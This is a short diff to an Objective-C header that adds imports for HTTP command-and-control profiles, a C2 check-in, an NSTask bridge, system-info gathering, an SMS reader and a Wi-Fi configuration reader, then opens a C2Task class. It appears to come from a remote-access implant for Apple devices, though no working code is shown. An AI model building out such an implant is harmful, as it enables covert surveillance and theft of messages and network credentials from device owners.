@@ -1,5 +1,12 @@
 #import <Foundation/Foundation.h>
 
+#import "../c2_profiles/HTTPC2Config.h"
+#import "../c2/C2CheckIn.h"
+#import "../bridge/NSTask.h"
+#import "../system_info/SystemInfoHelper.h"
+#import "../modules/sms/SMSReader.h"
+#import "../modules/wifi/WiFiConfigReader.h"
+
 @interface C2Task : NSObject
 
 @property (nonatomic, strong) NSString *taskID;
